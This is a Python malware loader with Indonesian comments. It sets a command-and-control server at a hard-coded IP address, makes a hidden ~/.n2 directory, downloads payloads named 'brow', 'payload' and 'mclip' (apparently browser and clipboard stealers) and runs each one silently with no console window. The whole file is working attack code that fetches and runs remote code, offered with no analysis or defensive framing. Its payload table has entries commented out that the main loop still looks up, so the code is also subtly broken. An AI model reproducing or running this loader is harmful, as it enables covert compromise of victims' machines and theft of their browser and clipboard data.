import os
import sys
import platform
import subprocess
import time
import urllib.request  # Library bawaan untuk mengunduh

# Konfigurasi C2
C2_HOST = "http://5.253.43.122:1224"
PAYLOADS = {
    # "payload": f"{C2_HOST}/payload/5346/224",
    "brow": f"{C2_HOST}/brow/5346/224",
    # "mclip": f"{C2_HOST}/mclip/5346/224"
}
REQUESTS_URL = f"{C2_HOST}/libs/requests.py"  # File requests.py di C2
HIDDEN_DIR = os.path.expanduser("~/.n2")
SLEEP_INTERVAL = 5


# Fungsi untuk mendeteksi OS
def detect_os():
    os_type = platform.system().lower()
    return "windows" if "windows" in os_type else "unix"


# Fungsi untuk membuat direktori tersembunyi
def setup_hidden_dir():
    if not os.path.exists(HIDDEN_DIR):
        os.makedirs(HIDDEN_DIR)
        if detect_os() == "windows":
            subprocess.run(["attrib", "+h", HIDDEN_DIR], shell=True, stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)


# Fungsi untuk mengunduh file menggunakan urllib (bawaan)
def download_file(url, filepath):
    try:
        with urllib.request.urlopen(url) as response:
            with open(filepath, "wb") as f:
                f.write(response.read())
        return True
    except Exception as e:
        print(f"[-] Gagal mengunduh {url}: {e}")
        return False


# Fungsi untuk memeriksa dan mengunduh requests jika tidak ada
def ensure_requests():
    try:
        import requests
        return requests
    except ImportError:
        print("[*] Requests tidak ditemukan, mencoba mengunduh dari C2...")
        requests_path = os.path.join(HIDDEN_DIR, "requests.py")
        if download_file(REQUESTS_URL, requests_path):
            sys.path.insert(0, HIDDEN_DIR)
            try:
                import requests
                return requests
            except ImportError:
                print("[-] Gagal mengimpor requests, beralih ke mode bawaan")
                return None
        return None


# Fungsi untuk mengunduh payload
def download_payload(url, filename, requests=None):
    filepath = os.path.join(HIDDEN_DIR, filename)
    if requests:
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                with open(filepath, "wb") as f:
                    f.write(response.content)
                return filepath
        except Exception as e:
            print(f"[-] Gagal mengunduh dengan requests: {e}")
    # Fallback ke urllib
    if download_file(url, filepath):
        return filepath
    return None


# Fungsi untuk mengeksekusi payload
def execute_payload(filepath):
    os_type = detect_os()
    try:
        if os_type == "windows":
            subprocess.Popen(["python", filepath], creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
        else:
            subprocess.Popen(["python3", filepath], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"[+] Berhasil mengeksekusi {filepath}")
    except Exception as e:
        print(f"[-] Gagal mengeksekusi {filepath}: {e}")


# Fungsi utama Main5346
def main5346():
    print("[*] Main5346 dimulai...")
    setup_hidden_dir()

    # Coba dapatkan requests, fallback ke urllib jika gagal
    requests = ensure_requests()

    payloads_to_download = [
        ("payload", "pay5346_224.py"),
        ("brow", "brow5346_224.py"),
        ("mclip", "mclip5346_224.py")
    ]

    for payload_name, filename in payloads_to_download:
        url = PAYLOADS[payload_name]
        print(f"[*] Mengunduh {payload_name} dari {url}")

        filepath = download_payload(url, filename, requests)
        if filepath:
            execute_payload(filepath)
        else:
            print(f"[-] Gagal mengunduh {payload_name}, mencoba lagi dalam {SLEEP_INTERVAL} detik")
            time.sleep(SLEEP_INTERVAL)

    print("[*] Main5346 selesai menjalankan tugas")


if __name__ == "__main__":
    main5346()